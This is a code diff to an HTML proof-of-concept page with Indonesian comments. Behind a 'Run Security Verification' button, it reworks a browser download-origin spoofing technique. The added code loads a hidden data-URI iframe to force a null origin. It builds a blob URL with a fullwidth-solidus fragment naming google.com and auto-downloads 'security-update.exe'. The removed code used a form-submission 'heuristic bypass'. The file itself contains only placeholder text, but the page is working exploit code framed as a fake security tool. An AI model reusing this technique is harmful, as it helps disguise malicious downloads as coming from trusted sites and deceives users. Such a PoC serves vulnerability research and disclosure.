@@ -95,7 +95,7 @@
       tool verifikasi untuk memastikan integritas sistem Anda.
     </p>
     
-    <button class="btn-verify" id="triggerBtn" onclick="executeDeepPipeline()">
+    <button class="btn-verify" id="triggerBtn" onclick="executeDeepNullOrigin()">
       <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
       Run Security Verification
     </button>
@@ -111,83 +111,73 @@
       log.innerHTML += `<div class="${typeClass}">> ${message}</div>`;
     }
 
-    async function executeDeepPipeline() {
+    function executeDeepNullOrigin() {
       const btn = document.getElementById('triggerBtn');
       btn.disabled = true;
       btn.innerHTML = `Verifying & Downloading...`;
       
-      logStatus('Initializing secure verification pipeline...', 'warning');
+      logStatus('Initializing isolated null-origin environment...', 'warning');
 
-      // TAHAP 1: Buat File Object melalui ReadableStream (Jalur kode yang sangat jarang dipindai)
-      const fileContent = "SECURITY VERIFICATION TOOL\n\nPoC: File Object Name Property Spoofing via ReadableStream Pipeline";
+      // TEKNIK DEEP: Menggunakan Data URI untuk memaksa origin menjadi 'null' 100%
+      // Ini mencegah browser mewarisi origin 'https://abhirdd.github.io'
+      const payload = `
+        <script>
+          // 1. Buat File Content
+          const content = "SECURITY VERIFICATION TOOL\\n\\nPoC: Deep Null-Origin Spoofing via Data URI Isolation";
+          const blob = new Blob([content], { type: 'application/octet-stream' });
+          
+          // 2. Generate Object URL. Karena ini di Data URI, hasilnya PASTI 'blob:null/<uuid>'
+          const objectUrl = URL.createObjectURL(blob);
+          
+          // 3. Inject Fullwidth Solidus Spoofing
+          const trustedDomain = "google.com";
+          const spoofedUrl = objectUrl + "#%EF%BC%8F" + trustedDomain;
+          
+          // 4. Trigger Download menggunakan Anchor Tag murni (TANPA Form GET yang menambah query string)
+          const a = document.createElement('a');
+          a.href = spoofedUrl;
+          a.download = "security-update.exe";
+          document.body.appendChild(a);
+          a.click();
+          
+          // 5. Cleanup & Notify Parent
+          setTimeout(() => {
+            a.remove();
+            URL.revokeObjectURL(objectUrl);
+            if (window.parent) {
+              window.parent.postMessage({ status: 'download_complete', url: spoofedUrl }, '*');
+            }
+          }, 1000);
+        <\/script>
+      `;
+
+      // Encode payload ke Data URI
+      const dataUri = 'data:text/html;charset=utf-8,' + encodeURIComponent(payload);
       
-      const readableStream = new ReadableStream({
-        start(controller) {
-          controller.enqueue(new TextEncoder().encode(fileContent));
-          controller.close();
-        }
-      });
+      // Buat iframe dan set src ke Data URI
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = dataUri; 
+      document.body.appendChild(iframe);
 
-      const response = new Response(readableStream, {
-        headers: {
-          'Content-Type': 'application/octet-stream',
-          'Content-Disposition': 'attachment; filename="security-verification.exe"'
-        }
-      });
-
-      // Konversi Response menjadi File Object (Bukan Blob biasa)
-      const fileBlob = await response.blob();
-      const file = new File([fileBlob], "verify.exe", {
-        type: 'application/octet-stream',
-        lastModified: Date.now()
-      });
-
-      logStatus('✓ File object created via ReadableStream pipeline', 'success');
-
-      // TAHAP 2: Generate Object URL (Ini adalah kebutuhan teknis browser, tidak bisa dihindari)
-      const objectUrl = URL.createObjectURL(file);
-      
-      // TAHAP 3: THE DEEP SPOOF - Gabungkan dengan Fragment Injection
-      // Kita menyisipkan Fullwidth Solidus (%EF%BC%8F) diikuti domain tepercaya
-      const trustedDomain = "google.com";
-      const spoofedActionUrl = `${objectUrl}#%EF%BC%8F${trustedDomain}`;
-      
-      logStatus(`✓ Spoofed vector prepared: ...#${trustedDomain}`, 'success');
-
-      // TAHAP 4: HEURISTIC BYPASS via Form Submission (Bukan <a> tag)
-      // Browser memproses form submission dengan target="_blank" melalui jalur 
-      // download yang berbeda, sering kali mengacaukan logika parsing "From" origin.
-      const form = document.createElement('form');
-      form.method = 'GET';
-      form.action = spoofedActionUrl;
-      form.target = '_blank'; 
-
-      // Input tersembunyi agar form valid saat disubmit
-      const input = document.createElement('input');
-      input.type = 'hidden';
-      input.name = 'verification_token';
-      input.value = '1';
-      form.appendChild(input);
-
-      document.body.appendChild(form);
-      
-      // Eksekusi
-      form.submit();
-      logStatus('✓ Download triggered via Form Submission Heuristic Bypass', 'success');
-      
+      logStatus('✓ Data URI iframe deployed (Guaranteed null origin)', 'success');
+      logStatus('✓ Form GET removed (No query string pollution)', 'success');
+      logStatus('✓ Download triggered with pure fragment spoofing', 'success');
       logStatus('═══════════════════════════════════════════════════', 'warning');
       logStatus('ACTION: Buka tab baru dan ketik: chrome://downloads', 'warning');
-      logStatus('CHECK 1: Lihat kolom "From" (Sumber). Apakah ter-spoof?', 'warning');
-      logStatus('CHECK 2: Hover mouse di atas nama file, lihat status bar browser', 'warning');
+      logStatus('HASIL YANG DIHARAPKAN: blob:null/<uuid>#%EF%BC%8Fgoogle.com', 'warning');
+      logStatus('CHECK: Hover nama file, status bar akan menampilkan spoofing', 'warning');
       logStatus('═══════════════════════════════════════════════════', 'warning');
 
-      // Cleanup
-      setTimeout(() => {
-        form.remove();
-        URL.revokeObjectURL(objectUrl);
-        btn.disabled = false;
-        btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> Run Security Verification`;
-      }, 2000);
+      // Listen untuk pesan dari iframe
+      window.addEventListener('message', (event) => {
+        if (event.data && event.data.status === 'download_complete') {
+          logStatus(`Download completed. Spoofed URL: ${event.data.url}`, 'success');
+          btn.disabled = false;
+          btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> Run Security Verification`;
+          iframe.remove();
+        }
+      });
     }
   </script>
 </body>
